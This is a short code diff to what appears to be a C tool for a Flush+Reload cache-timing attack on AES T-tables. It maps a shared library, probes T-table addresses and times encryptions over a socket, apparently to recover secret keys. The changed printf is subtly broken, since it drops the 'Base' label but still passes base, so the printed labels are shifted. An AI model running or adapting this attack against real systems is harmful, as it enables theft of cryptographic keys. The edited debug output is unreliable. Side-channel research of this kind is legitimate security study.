@@ -33,8 +33,8 @@ static const uint8_t sbox[256] =
 size_t sum;
 size_t scount;
 
-unsigned int *base;
-unsigned int *end;
+char *base;
+char *end;
 
 void communicate(int sockfd, unsigned int *plaintext, unsigned int *ciphertext)
 {
@@ -97,7 +97,7 @@ void flushAttack(int sockfd)
         map_size |= 0xFFF;
         map_size += 1;
     }
-    base = (unsigned int *)mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
+    base = (char *)mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
     end = base + size;
 
     int i, j, k;
@@ -127,8 +127,8 @@ void flushAttack(int sockfd)
     uint64_t min_time = rdtsc();
     srand(min_time);
     sum = 0;
-    unsigned int *probe[] = {base + 0x40c0, base + 0x44c0, base + 0x48c0, base + 0x4cc0};
-    printf("\nT-table addresses...\nBase: %p\nTe0: %p\nTe1: %p\nTe2: %p\nTe3: %p\n", base, probe[0], probe[1], probe[2], probe[3]);
+    char *probe[] = {base + 0x40c0, base + 0x44c0, base + 0x48c0, base + 0x4cc0};
+    printf("\nT-table addresses...\nTe0: %p\nTe1: %p\nTe2: %p\nTe3: %p\n", base, probe[0], probe[1], probe[2], probe[3]);
     for (k = 0; k < 4; k++)
     {
         for (i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
